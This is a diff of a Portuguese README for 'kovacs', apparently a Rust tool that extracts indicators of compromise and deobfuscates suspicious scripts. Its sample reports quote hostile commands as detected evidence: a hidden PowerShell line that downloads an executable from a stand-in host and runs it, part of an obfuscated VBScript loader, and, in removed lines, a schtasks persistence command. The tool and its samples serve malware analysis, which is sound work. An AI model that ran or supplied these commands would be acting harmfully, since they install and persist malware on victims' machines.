@@ -4,7 +4,7 @@
 
 ## Funcionalidades
 
-* **Geração de Evidências:** Cria automaticamente um relatório `$HOME/.local/share/kovacs/evidences/HASH.evidence` contendo a Cadeia de Custódia (Hash SHA256) e os IOCs encontrados.
+* **Geração de Evidências:** Cria automaticamente um relatório `$HOME/.local/share/kovacs/evidences/HASH.evidence(.json .md)` contendo a Cadeia de Custódia (Hash SHA256) e os IOCs encontrados.
 * **Extração de Rede:** Identificação e extração de IPs e URLs.
 * **Desofuscação de Multiplas camadas:**
   * **Base64 Decoder:** Encontra e decodifica strings em base64.
@@ -36,25 +36,33 @@ cargo build --release
 ./target/release/kovacs <file_path>
 ```
 
-### Exemplo de Saída (`.evidence`)
+## Resultado
 
-```text
---- [ KOVACS EVIDENCE REPORT ] ---
-- Target: "payload_suspeito.vbs"
-- SHA256: bd7ea3076938b8966952a99e5cb832b7dc19f9ad00...
+#### `evidence.json`
+```json
+{
+  "urls": [
+    "https://url.example.net/"
+  ],
+  "ips": [],
+  "base64_strings": [],
+  "reversed_strings": [],
+  "script_obfuscation": [],
+  "stateful_obfuscation": [],
+  "shifted_array_strings": [],
+  "plaintext_iocs": [
+    "start /min cmd.exe /c powershell -WindowStyle Hidden -Command \"& { iwr -Uri '(https://url.example.net/Stb/Retev.php?kaDhs7ys.txt' -OutFile $env:TEMP\\BK473087.exe; Start-Process -FilePath $env:TEMP\\BK473087.exe -WindowStyle Hidden }\""
+  ]
+}
+```
+#### `evidence.ms`
+```markdown
+# --- [ KOVACS EVIDENCES ] ---
 
---- [ PLAINTEXT THREAT SCAN ] ---
-Plaintext IOC Detected: Set objShell = CreateObject("WScript.Shell")
-Plaintext IOC Detected: schtasks /create /tn "EdgeUpdatehp" /tr "%USERPROFILE%\payload.exe"
-
---- [ NETWORK IOCs ] ---
-URL: https://malicious-c2.com/drop.php
-
---- [ PLAINTEXT THREAT SCAN ] ---
-Plaintext IOC Detected: Set objShell = CreateObject("WScript.Shell")
-Plaintext IOC Detected: schtasks /create /tn "EdgeUpdatehp" /tr "%USERPROFILE%\payload.exe"
-
---- [ OBFUSCATION DETECTED (Array Math) ] ---
-[!] Array Shift Decoded: script:hTtPS://malicious-c2.com/drop.php
-[!] URL Detected: https://malicious-c2.com/drop.php
+## [ URL IOCs ]
+URL: hTtPS://url.example.net
+## [ OBFUSCATION DETECTED (Array Math) ]
+Array Shift Decoded: "script:hTtPS://url.example.net/?1/"
+## [ PLAINTEXT THREAT SCAN ]
+Plaintext IOC Detected: Dim lI, UOFY, QbJ2K, i : lI = Array(&H70 , &H61 , &H72 , &H6C , &H6D , &H72 , &H3D , &H69 , &H52 , &H77 , &H52 , &H53 , &H3C , &H30 , &H30 , &H69 , &H69 ...) : UOFY = Array(3 , 2 , 0 , -3 , 3 , 2 , -3 , -1 , 2 , -3 , -2 , 0 , -2 , -1 , -1 ....) : QbJ2K = "" : For i = 0 To UBound(lI) : QbJ2K = QbJ2K & Chr(lI(i) + UOFY(i)) : Next  : s = "Ge" & "tObj" & "ect" : Execute s & "(QbJ2K)"
 ```
